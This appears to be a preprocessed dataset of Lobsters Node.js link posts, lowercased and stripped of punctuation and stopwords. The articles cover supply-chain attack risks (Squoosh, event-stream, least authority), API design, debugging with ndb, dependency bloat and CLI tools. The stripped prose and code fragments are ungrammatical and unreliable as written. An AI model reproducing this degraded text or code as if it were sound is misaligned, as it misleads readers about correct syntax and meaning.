thing like header ensuring header untrusted script set discarded trusted script would use audited dependency noticing attack deploy malicious script could edit source hope contributor would nt notice commit result create pr change review merging seems unlikely let assume attacker making change build time avoid spotting visual change netlify automatically build pr branch easy review result change go live quickly see content change crewasaurus unless course locationorigin http squooshapp documentbodyinnerhtml lol would nt see staging origin would something like http squooshnetlifycom code live server would change content could deploy differentbutidentical server use host file point server access httpssquooshapp would catch example would nt catch attack triggered future date example spotting unexpected source change looking code example pretty easy tell malicious would spot amongst minified code looked minified output check treeshaking working expected nt btw nt something often assuming attacker ca nt bring external resource due csp mitigation going make part output want pr automatically include beforeafter size every asset including removedadded asset performance reason also mean spot increase caused something like coinhive j coin miner addition plethoraofarsejpg still miss something small something able offset removing code would nt immediately spot preview production mitigation assume preview build production build nt true move live branch netlify rebuilds deploys even already built git commit mean malicious package could look environment plus state github realise given build nt going published squooshapp case malicious package could nothing leaving trace staging version site deploy heading squooshapp could make change would nt notice live sometime much later build already completed particular commit pr another branch netlify reuse default way sure site checking staging site deployed live without feature could use trusted untrusted build system earlier trusted part could check output match output earlier build identical conclusion uh oh terrifying think static site mitigation detailed pretty complicated partial site server component database feel negligent use package nt audited copay seen attack like nt theoretical yet auditing task feel insurmountable nt really answer worry anyway sleep well
153,Lobsters,nodejs,Node.js programming,Common API mistakes and how to avoid them,https://blog.logrocket.com/common-api-mistakes-and-how-to-avoid-them-804fbcb9cc4b,common api mistake avoid,stingy data gon na need yagni represent upstream data welldefined object use forward compatible attribute naming normalize concept attribute use positive happy name apply robustness principle robustness principle test error condition monitor failed slow rest request production try logrocket http logrocketcomsignup logrocket start monitoring free take step back postman conclusion,advice article applies api however issue consider easier encounter application written dynamic language javascript versus static language java nodejs sometimes referred glue hold system oriented architecture together due ease communicating multiple backend service stitching result together reason example look written nodejsflavored javascript stingy data encountering object used api response far easy deliver every property object fact usually easier send entire object unmodified decide property add remove consider situation user social medium platform perhaps within application object resembles following id name thomas hunter ii username tlhunter friendcount avatar http exampleorgtlhunterjpg updated hometown ann arbor mi assume building api specifically asked provide identifier user username humanreadable name avatar however delivering complete object consumer api straightforward one could simply following ressend user whereas sending strictly requested user property would look like ressend id userid name username username userusername avatar useravatar even trivial justify decision heck already data someone might need let pas along philosophy get world hurt future first consider storage format used data think easy get data today might change tomorrow perhaps data entirely stored single sql database data needed respond user object retrieved single query containing subquery perhaps look something like select user select count friendcount userfriends id friendcount id limit one day upgrade storage mechanism application friendship may moved separate graph database last updated time might kept ephemeral inmemory database data originally decided offer consumer easy access become difficult access singular efficient query must replaced three query different system one always look business requirement determine absolute minimum amount data provided satisfies requirement consumer api really need perhaps nobody consumes api actually needed friendcount updated field soon field offered api response somebody going use something happens need support field forever important concept programming even name gon na need yagni always stingy data sending solution issue well issue implemented representing data welldefined object represent upstream data welldefined object representing data welldefined object ie creating javascript class avoid issue designing apis something many language take granted taking data one system hydrating class instance mandatory javascript particularly nodejs step usually skipped consider simple example nodejs api retrieves data another service pass response const request require requestpromise const user await request http apigithubcomuserstlhunter ressend user property relayed simple answer matter could happens one property retrieved wrong type vital consumer property missing blindly sending attribute along api control received consumer service request data upstream service convert object usually using jsonparse created pojo plain old javascript object object convenient risky instead let represent object domain object object demand apply structure object retrieved also used enforce property exist right type otherwise api fail request domain object user might look something like class user constructor user thislogin string userlogin thisid number userid thisavatar string useravatarurl thisurl string userhtmlurl thisfollowers number userfollowers nt pas along thisprivategists number userprivategists thislogin thisid thisavatar thisurl throw new typeerror user object missing required field static tojson return login thislogin id thisid avatar thisavatar url thisurl follower thisfollowers class simply extract property incoming object convert data expected type throw error data missing keep instance user memory instead entire upstream pojo representation would consume le ram tojson method called object converted json allows u still use simple ressend user syntax throwing error early know data passing around always correct upstream service internal organization decides provide user email field api accidentally leak email public sure use domain object throughout api response example api might respond toplevel user object making request specific user well array user object requesting list friend using domain object situation consumer service consistently deserialize data internal representation representing upstream data internally domain object circumvent bug provide consistent api use forward compatible attribute naming naming attribute object api response sure name manner going forward compatible update planning making future one worst thing api release backwardsbreaking change rule thumb adding new field object break compatibility client simply choose ignore new field changing type removing field break client must avoided consider user example perhaps today application simply provides information location simple city state string know want update service provide richer information location name attribute hometown store string information able easily insert richer information future release forward compatible one two thing first option likely violate yagni provide attribute user called hometown object property city municipality might feel like complicated thing bit early though especially end location attribute ever support document might look something like name thomas hunter ii username tlhunter hometown city ann arbor municipality mi second option le likely violate yagni principle situation use attribute name hometownname future update provide object called hometown contains richer information nice maintain backwards compatibility company pivot decides never provide richer information never stuck annoying hometown object however forever stuck hometownname hometown attribute consumer stuck figuring use name thomas hunter ii username tlhunter hometownname ann arbor mi hometown city ann arbor municipality mi country u latitude longitude neither option perfect many popular apis follow one approach normalize concept attribute mentioned earlier nodejs contributes many enterprise glue hold service together speed nodejs application written deployed unrivaled common pattern large company multiple service deep infrastructure java search application c service data backed sql frontend engineer come along need data service combined single http request mobile app remains fast ask c java team build service frontend developer process would slow outside responsibility upstream team nodejs come rescue frontend engineer fairly easily build service consumes data system combine single request building service combine data multiple service api facade need expose api consistent within consistent compared wellknown noun employed service example perhaps java service us camelcase c service us pascalcase building api responds mixture two case would result frustrating developer experience anyone using service would need constantly refer documentation endpoint casing system even snakecase completely fine need pick one stick another issue happen different service use different noun refer data another example java service might refer entity company c service might refer organization happens try determine whichever noun correct perhaps building api public consumption userfacing documentation refers entity organization case easy choose name time need meet team form consensus also important normalize type example consuming data mongodb service might stuck hexadecimal objectid type consuming data sql might left integer could potentially get large usually safest refer identifier string situation matter much underlying data hexadecimal veg representation binary number represented string like long type used consumer always string happy use positive happy name ever used api mix positive negative attribute name example negative field include disablenotification hidden false positive opposite enablenotification visible true normally recommend picking either approach using consistently come attribute name always recommend positive variant reason easy developer get confused double negative example glance following attribute try time long take understand mean unavailable false willing bet much quicker comprehend available true example negative attribute avoid broken taken secret debt correlating positive attribute functional free public credit caveat however depending product marketed may necessary choose negative name situation reference wellunderstood consider service allows user post status update traditionally service status update visible everyone recently introduced concept private status update word public positive version private negative however marketing material refers status post private situation adding public false field status update api would confusing consumer service would instead expect private true attribute rare negative attribute name acceptable api consumer expect named apply robustness principle sure follow robustness principle wherever may apply api quoting wikipedia principle conservative liberal accept others obvious application principle regard http header according http rfc header uppercase character first letter word separated hyphen example would contenttype however technically capitalization still acceptable contenttype first half robustness principle conservative mean always respond client using preferred header casing know certain consumer api able properly read nicely formatted sloppily formatted header api usable many different consumer possible second half principle liberal accept others mean case http header normalize incoming header consistent format read intended value regardless casing whenever possible long introduction ambiguity even consider supporting robustness principle internals api well example expect api receive username property receive username property really harm accepting incorrect case actually might accept username username receive http header defined semantics handling duplicate header entry json however accepting casing username might result hardtodebug error api receives attribute wrong type string number expected perhaps big deal especially provided string numeric example api accepts numeric width argument receives string hard imagine ambiguity situation deciding field coerce one type another bit judgement call sure document situation perform type coercing test error condition consumer communicates service expects consistentlyformatted response request example consumer regularly transmits receives json reasonable expect consumer take response receives parse content json error occurs response formatted json break consumer sort interesting edgecases need tested prevent happening consider nodejs application written using express within request handler application throw error express server may respond contenttype textplain body contains stack trace broken consumer json parser usually prevented writing middleware convert caught error nicely formatted json response appget req re resjson error false expected json response data hello world appget triggererror req re normally return textplain stacktrace throw new error oh something broke generic error handler middleware appuse err req re next consolelog errstack log error resstatus json error errmessage respond json error possible create acceptance test invoke various error test response create secret endpoint application throw error try upload file large send payload incorrect type send malformed json request etc api use json http grpc service course equivalent testing approach need taken monitor failed slow rest request production deploying new web app website leveraging rest easy part making sure everything continues serve resource app thing get tougher interested ensuring request backend party service successful try logrocket http logrocketcomsignup logrocket like dvr web apps recording literally everything happens site instead guessing problem happen aggregate report problematic network request quickly understand root cause logrocket instrument app record baseline performance timing page load time time first byte slow network request well log redux ngrx vuex actionsstate start monitoring free take step back within corporate environment easy get pattern allowing complex client library handle communication service likewise easy allow complex service library handle serialization object clientconsumable format much abstraction company may get point nobody know data sent wire look like anymore situation happen amount data transmitted network may balloon control risk transferring personally identifiable information pii also increase api ever need consumed outside world may result lot painful refactoring clean important take step back every stop looking apis using organization de facto tool instead look api using generic shelf product working http apis one product achieving postman tool useful viewing raw http payload even convenient interface generating request parsing response working large company worked one service consumed data another service service would immediately parse json response remote service pojo crawl data structure one thing caught eye another json parse called conditionally call quite place since response already parsed code operated manner year regenerated request using postman discovered bug upstream service would certain circumstance doubleencode json response consumer would check attribute string would first parse object continue feat fairly easy javascript might nightmare static language first time bug encountered engineer probably spent hour debugging discovering problem adding conditional imagine api public hundred engineer go problem conclusion following advice article sure avoid common pitfall present modern apis advice applied heavily dynamic language like javascript generally applicable every platform
154,Lobsters,nodejs,Node.js programming,Welgo – Node.js UI Library with React-Inspired Components,https://github.com/Bloomca/welgo,welgo nodejs ui library reactinspired component,welgo getting started htm example installation api react caveat camelcase testing weltest jsdom limitation babel configuration react preset rationale license,welgo serverside library reactlike component jsx supported supposed used instead traditional templating language like jadepug handlebar etc zero dependency reactinspired component async component fetch data need getting started const welgo require welgo const htm require htm const html htmbind welgocreateelement const express require express const app express async function page prop gettopics call async function inside component const topic await gettopics return html ul topicsmap topic html li topic topic li ul function topic title description return html welgofragment title p description p appget async req re const page await welgorender html page gettopics return new promise resolve settimeout resolve title title description description ressend page applisten consolelog running port used library htm especially nifty since nt need transpile code nt often nodejs codebase however use welgocreateelement jsx setup work better see full example installation welgo published npm need save dependency need use node order use want use clientside keep mind source code transpiled api familiar react know pretty much since lifecycle server component function two parameter passed property resolvers second parameter named resolvers data passed root rendering treat context keep mind render page still use data something sending reply eg tweak metadata another big difference component asynchronous default easily following async function movie prop getmovie const movie await getmovie propsid render page use render function asynchronous default well since component asynchronous const render createelement welgo async function handle req re const page await render createelement page query reqquery user id getmovie ressend page whole api createelement render fragment caveat several caveat aware use class classname property work pas string style property pas object style property use hyphencase camelcase testing testing two choice use render method render html string search use weltest library library provides capability search component wrap query jsdom use regular dom api limitation component lifecycle hook real life server get request form reply send user done want anything clientside javascript file using query selector browser library zero runtime designed babel configuration want use library babel main trick set custom pragma react preset presets babelpresetreact pragma welgocreateelement pragmafrag welgofragment rationale recently clientside framework achieved lot namely component became standard approach one biggest advantage composition move component around app without big pain server though usually lot template time becomes extremely fragile move partial around biggest problem template idea data need pas toplevel therefore hard explain time need fetch data order render exact view approach make template function asynchronous default fetch data rendering also component share data injected top level nt pas data way manually license mit
155,Lobsters,nodejs,Node.js programming,Getting started with debugging nodeJs applications with ndb,https://geshan.com.np/blog/2019/01/getting-started-with-debugging-nodejs-applications-with-ndb,getting started debugging nodejs application ndb,default debugging process ndb prerequisite debugging nodejs application debugging nodejs express application demo currency api file test getting started install ndb ndb run app ndb node nodemon let debug code debugging nodejs thing readme conclusion tldr,nodejs released almost year ago default debugging process nodejs read nodejs quite clumsy already aware need add inspect node script node inspector also dependent chrome look proper web socket connection hard debug using chrome node debugger honest pain neckfinally google chrome lab released ndb say improved debugging experience nodejs enabled chrome devtools boon debug nodejs appi going show step step process debugging nodejs application ndb word learn debug nodejs application using ndb see action let roll sleeve get started prerequisite debugging nodejs application prerequisite get started nodejs installed system nobrainer still worth mention general knowledge running node script working nodejs appsyou prior debugging experience nodejs languagefor debugging nodejs application place another script use full nodejs express application open source application used demo testing nodejs applicationdebugging nodejs express application demo using opensource currency api stepbystep getting started debugging nodejs application built using express j framework also check running app hosted zeit see usd aud rate examplethe idea application simple conversion rate available database fetch database fetch another api send back user also saving rate database time async later use step step guide easy followyou clone application github run npm install get ready debugging simple application logic exchangeratesjs file mocha test demo testing nodejs getting started install ndb installing ndb easy need get started debugging nodejs application install ndb would suggest install globally npm npm install g ndb yarn yarn global add ndb also install use locally per app want one thing fix get latest version chrome saw permission run app ndb node nodemon debugging nodejs application using ndb directly run nodejs app script rather node example used node indexjs nodemon indexjs development debug app run ndb indexjs notice nt need put inspect experience lot smootheryou nt need remember different port go chrome devtools open different inspector window debug relief ndb open screen like ndb ndb indexjs please add breakpoint line ran application ndb run debug mode stop breakpoint like hit http browser set breakpoint exchangeratesjs like screenshot ndb allows run script debugging example run ndb npm start use nodemon run mean debug application changing code greatas example run ndb npm start debug nodejs express applicationyou also debug test command like ndb npm let debug code debugger working place break point run code speed conveniencethe essential shortcut step function call step functionthe usual debugging workflow assume familiar advanced line debugging nodejs thing debugger ndb add watchescheck call stack tracecheck processthe console tab also helpful want quick nodejs code contextread official readme screenshot useful console conclusion tldr debugging nodejs application ndb better developer experience compared default debugger debug currency api nodejs express app run following command give node installed npm install g ndbgit clone email protected geshancurrencyapigitcd currencyapinpm installndb npm startafter ndb debugger open add breakpoint line srcexchangeratesjsthen open http browsernow app pause breakpoint enjoy continue debuggingif work app debug nodejs application approachwelcome new way debugging nodejs application browser independent lot smoother default experience step debugging nodejs application gamei hope post helped debug nodejs application better thing share debugging nodejs apps better usage ndb please comment
156,Lobsters,nodejs,Node.js programming,API using GraphQL and NodeJs,https://medium.com/programming-society-gazette/part-1-api-using-graphql-and-node-js-3423a6004b96,api using graphql nodejs,git git tslint function explanation,keep track work using git installed go git install itin project initialize repository git repository git initfor working developement version need nodemon tsnode reloading server automatically change made file executing t file without building respectively use tslint code linter terminal inside project directory run commandnpm quiet nodemon tsnode tslint tslinteslintrules savedevnon npm user copy packagejson file devdependencies nodemon tsnode tslint tslinteslintrules create tslintjson file inside root directory copy code given belowtslint configurationinside script packagejson copy following code dev nodemon nodeprecation watch src t ignore src spects exec tsnode srcappts lint tslint c tslintjson src t fix use npm run dev running code development mode npm run lint lint code actual coding begin create file inside src folder named appts copy inside srcapptsfunction testfunction string return messi ronaldo legend export default testfunction test create test folder inside src create file usertestspects testing install required module using mocha testing chai assertion run command inside projectnpm quiet chai chaihttp chaiaspromised mocha mochatypescript sinon savedevnon npm user copy inside devdependencies chai chaiaspromised chaihttp mocha mochatypescript sinon create script testing copy code inside script test mocha nodeprecation timeout require tsnoderegister spects use command using npm test far packagejson look like name graphqltodo version description graphql api todo application main indexjs script dev nodemon nodeprecation watch src t ignore src spects exec tsnode srcappts lint tslint c tslintjson src t fix start gulp cd dist node nodeprecation appjs test mocha nodeprecation timeout require t noderegister spects keywords author license isc devdependencies chai chaiaspromised chaihttp gulp gulpsourcemaps gulptypescript mocha mochatypescript nodemon sinon tsnode tslint tslinteslintrules typescript inside srctestusertestspects copy codeusertestspects contains testsexplanation line importing test module file apptsline defining suite run defining class usertestsline test declare test message running also define public test run use chaiexpect test assetion testrun test running npm test everything work fine look like
157,Lobsters,nodejs,Node.js programming,Taking care of your dependencies,https://sirikon.me/post/taking-care-of-your-dependencies/,taking care dependency,taking care dependency realization company edit waweic suggested taking action test dependency actually responsible developer toolkit article github contact bundle phobia package phobia costofmodules analyzemodulesize stay curious picky awesome list,taking care dependency working recently node javascript general probably seen many complaint andor joke infamous weight nodemodules folder plenty opinion issue npm fault developer fault latter realization working node many year frontend backend project simple complicated one sure many thing one exception much better handling dependency add dependency project add point failure portion project ca nt control anymore even use package locking saying never add dependency little bit code much better little dependency let tell something npm nt community driven company company commercial interest profitable company born die commercial interest born die dependency npm package day npm nt anymore package nt anymore well project work anymore summarize le external dependency better probability dependency deleted npm lower amount external code probably end debugging time lower today reality one choosing bloated library million dependency feature using one instead looking lightweight one one thing well one including cli tool framework inside library case someone need cli tool instead providing two package share core functionality build library api cli top one including data collection mechanism library know installing instead one needing library left pad checking string valid email spa instead writting edit waweic suggested using goodworking external library check email valid might right thing critical environment term security like nodejs backend taking action want take care dependency glad hear point already know summarize write code instead adding little dependency project choose singlefeature library fullfeatured library framework node standard library pretty decent lot thing choose lightweight dependency heavy one also think testing dependency test dependency many dependency already test need pas releasing new version could argue well dependency already test assume dependency work reality way complicated way ensure project actually work testing whole including dependency least many dependency pretty easy make test dependency like markdown parser cypher etc much harder test dependency twitter client example adding dependency reasonably easy test consider testing even unit test let say add library manages jwt token building parsing validation one day library get updated decide change dependency use another one consider better option would nt handy test add dependency project dependency becomes functional part project becomes responsability also need proper testing part project testing dependency way protect make easily replaceable responsible developer toolkit leave tool currently use analyze npm package adding dependency analyze project suggestion welcome make pr article github contact bundle phobia enter name npm package get size add bundle including handy info like size dependency time could take download conectivity oriented bundle size analysis frontend development package phobia similar bundle phobia way simpler enter npm package get installation size published size size npm package costofmodules handy cli tool analyze dependency current project current folder return size dependency total size one really helpful previous one might problem analyzing package example nodesass download binary file installed reflect bundle phobia package phobia fail also allows check size operating system choice dependency might vary analyzemodulesize like costofmodules analyzes dependency size current project costofmodules show first level dependency analyzemodulesize show complete dependency tree size stay curious picky npm package taking much size check packagejson maybe dependency nt really needed way using library could even open issue discus maintainer directly fork library remove unnecesary stuff upload fork npm prefix username nt satisfied first bloated library find find check contribute awesome list search keyword npm directly check cool project something want see done picky dependency try find best write apply project exigence apply dependency excellent way improve ecosystem make better lighter software much easier
158,Lobsters,nodejs,Node.js programming,The node_modules problem,https://dev.to/leoat12/the-nodemodules-problem-29dc,nodemodules problem,nodemodules decided vent frustration nodemodules comparison nodemodules toread cli project window nodemodules nodemodules npm language nodemodules conclusion discussion,think first one talk problem even devto quick research trying found solution concluded image head text nodemodules folder project dependency stored common knowledge weight also common knowledge decided vent frustration black friday mean discount opportunity update computer therefore decided buy ssd boost performance laptop tb hdd gb ssd file right sum gb lose much space decided housekeeping work even includes making backup project project make put github sometimes experimenting worth trouble keep anyway started copy paste process remembered heavy nodemodules comparison one example show clearly problem nodemodules folder toread cli project see imagem size folder really problem although get later file folder kidding simple cli project file comparison let see many file folder window folder system counting really thought nodemodules would win case folder almost half amount file entire operating system said problem copying nodemodules folder one place another size amount file folder complexity tree nightmare hdd take many minute discover file let alone copy end also impact npm performance meme also comparison come passion serverless rare implement function java javascript since bundle function along dependency good way compare one efficient dependency management one project wtote function language virtually feature java bundle size mb nodejs bundle size mb therefore nodejs better job size dependency well language besides nodejs experience dealing dependency two language java c opinion similar way handling dependency much efficient way nodejs java maven gradle dependency management application work basically remote repository dependency generally maven central local repository maven always look dependency local repository first found downloads remote repository dependency within project like nodemodules folder global downloaded used many project add pomxml c follows idea list dependency csproj file nuget take care dependency also remote local repository much efficient handle dependency way download use project locally think also difference culture way language structured people see library java mature core library deal almost anything common scenario therefore library java generally meant abstraction java already making easier use therefore library shallow dependency tree reaching java core library much quicker see nodejs hand opposite everything become library even library sum two number hypothetical example hope library heavily dependent one another generating deep dependency tree many file folder conclusion discussion certainly qualified criticize nodejs structure engineering user clearly see problem lesson language used improve dependency management paramount nowadays almost every application think problem came done solve would interesting hear experienced developer remedy
159,Lobsters,nodejs,Node.js programming,"Discover how to use fx effectively, a JSON manipulation command line tool",https://medium.com/@antonmedv/discover-how-to-use-fx-effectively-668845d2a4ea,discover use fx effectively json manipulation command line tool,discover use fx effectively json manipulation command line tool fx npm brew standalone binary fx fx http swapicoapiplanets fx fx interactive digger pretty printing fx http swapicoapiplanets http swapicoapiplanets http swapicoapiplanets fx snippet lodashfp adding snippet edit inplace fx fx using xargs fx fx http swapicoapiplanets searching json fx fx streaming fx fx theme support fx fx fx patreon github,discover use fx effectively json manipulation command line toolfx popular json manipulation command line tool installed via npm brew downloaded standalone binarynpm g fxfx come handy curl command api return json want dig structure see pipe json fxcurl http swapicoapiplanets fxfx really neat interactive mode digging jsonyou use mouse arrow key navigating json fx support fold click filed expand press right arrow expand press e key expand field recursively press shift e collapse everything backinteractive diggerwhile interactive mode press dot key see cursor end terminal window popup json field use arrow key choose field press enter continue find needed data need go back one level press ctrl w erase last path segment command accurately remove last part next bracket want start press ctrl u btw field write javascript expression path expressionspretty printingsometimes need interactive digger want pretty print json stdout done adding argument fx commandcurl http fx print part json specify desired pathcurl http fx filmsrequesting api time time consuming save disk first curl http datajsonnow pas file first argument fxfx datajson filmseach argument fx javascript function let create fxrc file put useful function snippet reusesnippetslet add power lodash command line install lodash globallynpm g lodashcreate fxrc file home directory put next line itobjectassign global require lodashfp able call lodash method even without using prefix example see committing react recently curl http apigithubcomreposfacebookreactcommits fx groupby commitauthorname mapvalues size topairs sortby reverse take frompairslet count usage different word commit messagescurl http apigithubcomreposfacebookreactcommits fx map commitmessage map word flatten map lowercase groupby identity mapvalues size topairs sortby reverse take frompairsadding snippetsthis pretty easy well example one api requires document encoded let see donecreate function assign global example str bufferfrom str tostring able something like fx datajson value jsonstringify curl x postor split separate function fx datajson jsonstringify value curl x postedit inplacewith fx easily modify json object using spread operatorecho count fx count try modify file save disk one command corrupt filefx datajson count datajsonthis common command line example sed special flag edit inplace sed fx special function called save save json file return itfx datajson count savewe even output modified field saving diskfx datajson count save countusing xargsfx print string stdout raw string without quote useful making fx filter talk nonjsonbased system want pas list argument next snippet come handygloballist json jsonforeach x consolelog x undefined default undefined print stderr affect pipescurl http fx film list xargs curlsearching jsonfx support interactive json searching press type pattern searchto jump next pattern match press n apply filter well fx work great simultaneouslybut want something different think javascript best language working json acronym javascript object notation want find occurrence pattern print stdout create search snippet let create search snippet recursively search json fx datajson find fixi even better using previous snippet list print founded partsfx datajson find fixi list xargs fx datajsonstreamingfx support json streaming well use parsing log etckubectl log fx messageselect filter desired message prepending select helperkubectl log fx select x xlevel info messageor concatenate json file cat pipe fxcat json fx theme supportfx support theme well change color indentglobalfxstylespace awesome theme fx hope enjoy using fx like please consider backing patreon follow github
160,Lobsters,nodejs,Node.js programming,"Goodbye Transform-Streams, long live ES9 Async Generators",https://medium.com/@andreasimonecosta/goodbye-transform-streams-long-live-es9-async-generators-86e60284fb80,goodbye transformstreams long live async generator,goodbye transformstreams long live async generator tl dr transform stream async generator come play check confident generator performance,goodbye transformstreams long live async generatorstl drclickbait title async generator powerful news throw transform stream trashwhat transform stream nodejs doc say transform stream duplex stream output computed way input example include zlib stream crypto stream compress encrypt decrypt data going explain find lot free resource online really powerful resource build amazing thing nodejs drawback simple implement even easy stuff anyway need handle transform logic chunk odds type stream besttransform stream independent unit code could directly piped stream taking advantage case backpressure automatically applied worry different time need readable stream writable one nodejs optimize process making concurrenthow async generator come play async generator special news let u easily implement asynchronous iterator interface nodejs stream already implemented allowing u like following stream readable also asynchronous iterablethis tutorial async stuff want know async iterables async generator check used transform chunk like transform stream main purpose handle data flowin short word async generator let time completely control query data source soon available write data write stream soon receive source course must wait time query data time write read write asynchronous operationsthe point read write asynchronous would lie told something similar transform stream async generator thing easier let asynchronous data flow managed entity code consider async generator flow control toollet see example pipe two generator filtering even number increment one odd one writing processstdout number asynchronously coming misterious readable stream example explicit flow control async generator simply consume chunk soon possible iiafe thing change due third forawaitof async iterable returned async generator piping could used differently giving u opportunity let entity manage whole asynchronous iterationare confident generator worry working little module let write function also async one trasform async generator furthermore coded little helper function easily pipe async generator togetherlet see use asyncgeneratorsfactory see filter function must return undefined chunk discarded normal transform function must always return value composition function yet supported working themnow let see pipe generator great find complete gitshere see source code helperswhat performance tested async generator v transform stream file small medium size file see lot difference sometimes transform stream better sometimes async generator betterif need use asyncgeneratorsfactory helper function know thing go bit sloweranyway big size file seems async generator better also transformation purpose test needed also different type stream help
161,Lobsters,nodejs,Node.js programming,Faster than transform streams (maybe) - Node v10/11,https://github.com/jfet97/sbtts,faster transform stream maybe node,sbtts gmailcom http twittercomjfieldeffectt,sbtts somethingbetterthantransformstreams maybe node minimum create readable stream const readablestream like example const readablestream require f createreadstream readtxt highwatermark create writable stream const writablestream like example const writablestream require f createwritestream writetxt create one function modify chunk asynchronously const tostring chunk chunktostring const touppercase string stringtouppercase const crypt uppercasedstring uppercasedstring reverse join import pipe function const pipe require sbtts use pipe inputstream outupstream modifier await pipe readablestream writablestream tostring touppercase crypt resolve writablestream could use close output stream pipe inputstream outupstream modifier const outputstream await pipe readablestream writablestream tostring touppercase crypt outputstreamend writablestreamend seems bit faster transform stream simpler tested using benchmarkjs obviously api powerful transform stream could become dreamer big file seems gain second seems test let gmailcom http twittercomjfieldeffectt
162,Lobsters,nodejs,Node.js programming,POLA Would Have Prevented the Event-Stream Incident,https://medium.com/agoric/pola-would-have-prevented-the-event-stream-incident-45653ecbda99,pola would prevented eventstream incident,pola would prevented eventstream incident news agoric pola principle least authority would pola helped bitcoin wallet copay malicious person control widely used package could something like easily imported package even one controlled malicious agent able take private key first place principle least authority pola today keep virus bay pola ambient authority excess authority eliminating ambient excess authority locking javascript especially realm troublesome piece code test code live sandbox alone xkcd xkcd getting sandbox cycle safe interaction interaction equally dangerous safe interaction possible next step nodejs community discussing recorded nodejs security workgroup discussion realm s object capability securely bring third party application platform million developer reference footnote,pola would prevented eventstream incidentthe javascript world rocked week news popular npm package eventstream included malicious code attempted steal private key certain bitcoin userssince attack discovered javascript community cryptocurrency community passionately debating prevent attack agoric think attack entirely preventable answer pola principle least authorityhow would pola helped attack happened dominic tarr maintainer eventstream number open source package handed ownership volunteerthis volunteer added malicious package dependency eventstream malicious package narrowly expertly targeted execute context bitcoin wallet copayhere shocking malicious person control widely used package could something like easilya number different solution suggested need change open source culture pay developer maintain package better package management lockfiles dependency pinning deterministic buildsthese good point miss something hugean imported package even one controlled malicious agent able take private key first placebelieve ideal actually achievable mechanism achieving pola principle least authoritythe mistake asking prevent attack asking limit damage done attack succeeds former assumes infallibility latter recognizes building system human alan karp pola today keep virus bay hp labswhat pola principle least authority pola say code granted authority need perform task code lot power code read file delete file send file information within someone else record keystroke use laptop camera steal identity hold computer ransom steal cryptocurrency drain bank account code write need thing give authority let take look authority handled module nodejs let say want import function concatenates exclamation point end string let say look like import use like seems fine importing addexclamation could easily read bitcoin wallet sent private key instead written like well seems terrible worse without inspecting code would idea happeningthe proposed solution using package personally trust curated list audited package etc missing actual problem code easy access file system network need eitherthis kind easy access known ambient authority need explicitly hand access file system laying around scope piece code pick contrast system follows principle least authority access denied default must granted explicitly able usedthe fact module need access file system network still access known excess authoritypola ultimately eliminating ambient excess authority motto meant inspirational pola actually achieved pola motto locking javascriptit turn javascript especially good allowing u cut access possibly harmful external effect much better widely used programming language javascript nearly access outside world provided host via global variable name host browser includes global variable window document host node provides global variable f http mean cutting access global scope global object cleanly cut access harmful external effect case language like java access outside world mixed functionalityrealms proposal exactly currently going javascript standard process well become part javascript language realm make incredibly easy cut access outside world instance let take troublesome piece code provided david gilbertson necessarily look like network request code review would jump problematic maybe david point difficult spot shenanigan obfuscated code got chance create realm browser try execute code inside test matter whether spot shenanigan code access network window self fetch undefinedcode live sandbox alonefrom xkcdbut isolation problem well code need able interact outside world order thing xkcd entitled sandboxing cycle make fun apparent tradeoff security interaction order protect limit interaction order accomplish task create new connection discover connection make u vulnerable create new sandbox cycle forevergetting sandbox cycle safe interactionsthe key insight getting sandbox cycle interaction equally dangerous fact make interaction safe quickly identify small number remaining interaction dangerous limit thoselet go back addexclamation example let imagine nodejs worked differently module want use file system network explicitly passed access word eliminating ambient authority code explicitly granted access note example significant work would done actually enable something like eliminate ambient authority make much much easier see code deserves extra scrutiny previous example module imported could include dangerous action accessing network without u easily realizing rewrite nodejs explicitly pas access would immediately obvious spend time money auditing string function access anything external pretty safe worst could give wrong answer hang simple string function asking network access whoa nelly something wrongthe principle least authority eliminating ambient excess authority make many attack worth mean selectively safely connect sandbox without creating dangerous security hole therefore without getting sandbox cycle breached malicious actor still much safe interaction possiblenext stepshere current effort implement pola javascript world worth following nodejs community discussing various way try implement pola see also recorded nodejs security workgroup discussion least authoritya module system would granted module least authority would prevented eventstream exploit presented mark miller agoric november meetingrealms javascript standard track proposal level standardization process allows create execution environment without access host environment without access code running realm agoric secure subset javascript build realm add additional feature enforcing pola object capability s derived joint effort salesforce currently us tech behind s securely bring third party application platform million developersthanks mark miller dominic tarr bill tulloh dean tribble helpful insightsreferencesthe nodejs security workgroup discussion least authorityfootnotes four exception javascript clear separation pure computation effect datenow mathrandom timezones current locale purpose internationalization
163,Lobsters,nodejs,Node.js programming,Make website screenshots and mobile emulations from the command line,https://github.com/vladocar/screenshoteer,make website screenshots mobile emulation command line,screenshoteer puppeteer installation example http githubcomgooglechromepuppeteerblobmasterdevicedescriptorsjs license,screenshoteer make web screenshots mobile emulation command line tool based puppeteer installation use screenshoteer like screenshoteer url http wwwexamplecom html localy copy url path browser screenshoteer url file user indexhtml screenshoteer url file c user randomhtmlfilehtml help puppeteer headless chrome generate screenshot entire web page parameter h help url web page url emulate emulate web device example emulate iphone fullpage true false take screenshot entire web page true true default parameter pdf generate additional pdf w width web page px h height web page px waitfor wait time page load millisecond waitforselector wait selector appear page el cs selector documentqueryselector auth basic http authentication exclude image stylesheet script font click example selector excellent way close popups click button page file output file name optional otherwise based page title timestamp example screenshoteer url http newsycombinatorcom fullpage false screenshoteer url http wwwredditcomrnodejs emulate iphone screenshoteer url http wwwnytimescom emulate nexus screenshoteer url http wwwredditcomrjavascript w h fullpage false screenshoteer url http wwwredditcomrjavascript w h fullpage false screenshoteer url http lobster pdf screenshoteer url http lobster w screenshoteer url http newsycombinatorcomitem el fatitem screenshoteer url http sitecom auth username password screenshoteer url http wwwnytimescom image screenshoteer url http wwwnytimescom script screenshoteer url http wwweconomistcom click ribbonclosebutton screenshoteer url file user indexhtml screenshoteer url http wwwslashdotorg file tmpslashdotpng list supported mobile device http githubcomgooglechromepuppeteerblobmasterdevicedescriptorsjs license project licensed mit license
164,Lobsters,nodejs,Node.js programming,"New fx 8.0 release features including Interactive Digger, Arrow Keys navigation",https://github.com/antonmedv/fx/releases/tag/8.0.0,new fx release feature including interactive digger arrow key navigation,reload reload,big feature release therefore even major version updated several number release includes perform action time signed another tab window reload refresh session signed another tab window reload refresh session
